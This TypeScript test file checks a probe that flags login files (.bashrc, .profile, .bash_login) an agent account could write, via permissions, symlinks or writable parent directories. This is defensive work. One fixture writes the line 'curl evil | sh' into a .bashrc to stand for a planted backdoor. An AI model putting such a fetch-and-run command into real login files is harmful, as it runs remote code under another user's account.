import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { chmodSync, mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { test } from 'node:test';
import { LOGIN_FILES_PROBE } from '../agent-user.js';

/**
 * The login-file part of the probe, run in a scratch HOME. The agent account is a stand-in that
 * can write whatever is writable by group or others, as an account in the task group can.
 */
function probe(prepare: (home: string) => void): string {
  const home = mkdtempSync(join(tmpdir(), 'login-files-'));
  try {
    chmodSync(home, 0o755);
    prepare(home);
    const agent =
      'as_agent() { [ "$1" = test ] && [ "$2" = -w ] && [ -n "$(find "$3" -maxdepth 0 \\( -perm -g+w -o -perm -o+w \\) )" ]; }';
    const run = spawnSync('bash', ['-c', `${agent}\n${LOGIN_FILES_PROBE}`], {
      env: { PATH: process.env.PATH ?? '', HOME: home },
      encoding: 'utf8',
    });
    return run.stdout.trim();
  } finally {
    rmSync(home, { recursive: true, force: true });
  }
}

test('login files the agent cannot write, or no login files at all, pass', () => {
  assert.equal(
    probe(() => {}),
    'FACT agent_login_files=none',
  );
  assert.equal(
    probe((home) => {
      writeFileSync(join(home, '.bashrc'), 'true\n', { mode: 0o644 });
      writeFileSync(join(home, '.profile'), 'true\n', { mode: 0o644 });
    }),
    'FACT agent_login_files=none',
  );
});

test('a login file the agent group can write is a finding', () => {
  const out = probe((home) => {
    writeFileSync(join(home, '.bashrc'), 'curl evil | sh\n');
    chmodSync(join(home, '.bashrc'), 0o664);
  });
  assert.match(out, /^FACT agent_login_files=.* \S+\/\.bashrc$/u);
});

test('a link to a file the agent can write is a finding, and a directory it can write is one', () => {
  const link = probe((home) => {
    writeFileSync(join(home, 'elsewhere'), 'x\n');
    chmodSync(join(home, 'elsewhere'), 0o666);
    symlinkSync(join(home, 'elsewhere'), join(home, '.profile'));
  });
  assert.match(link, /\.profile$/u);
  const dir = probe((home) => {
    chmodSync(home, 0o775);
  });
  assert.match(dir, /^FACT agent_login_files=\s*\S+$/u);
  // The link's target is a root-owned (here: the test's own) file that nobody can write, but the
  // directory it sits in is the agent's: it renames the file away and puts its own there.
  const swappable = probe((home) => {
    mkdirSync(join(home, 'dotfiles'));
    writeFileSync(join(home, 'dotfiles', 'bashrc'), 'true\n', { mode: 0o644 });
    chmodSync(join(home, 'dotfiles'), 0o775);
    symlinkSync(join(home, 'dotfiles', 'bashrc'), join(home, '.bashrc'));
  });
  assert.match(swappable, /\.bashrc$/u);
  // ... and a link whose target is in a directory the agent cannot write is fine.
  assert.equal(
    probe((home) => {
      mkdirSync(join(home, 'dotfiles'));
      writeFileSync(join(home, 'dotfiles', 'bashrc'), 'true\n', { mode: 0o644 });
      symlinkSync(join(home, 'dotfiles', 'bashrc'), join(home, '.bashrc'));
    }),
    'FACT agent_login_files=none',
  );
  // A sticky directory (the real /tmp above these) lets the agent add entries, not replace ours.
  const sticky = probe((home) => {
    mkdirSync(join(home, 'dotfiles'));
    writeFileSync(join(home, 'dotfiles', 'bashrc'), 'true\n', { mode: 0o644 });
    chmodSync(join(home, 'dotfiles'), 0o1777);
    symlinkSync(join(home, 'dotfiles', 'bashrc'), join(home, '.bashrc'));
  });
  assert.equal(sticky, 'FACT agent_login_files=none');
  // A link to nowhere is refused.
  assert.match(
    probe((home) => symlinkSync(join(home, 'gone'), join(home, '.profile'))),
    /\.profile$/u,
  );
  const notAFile = probe((home) => {
    mkdirSync(join(home, '.bash_login'));
  });
  assert.match(notAFile, /\.bash_login$/u);
});
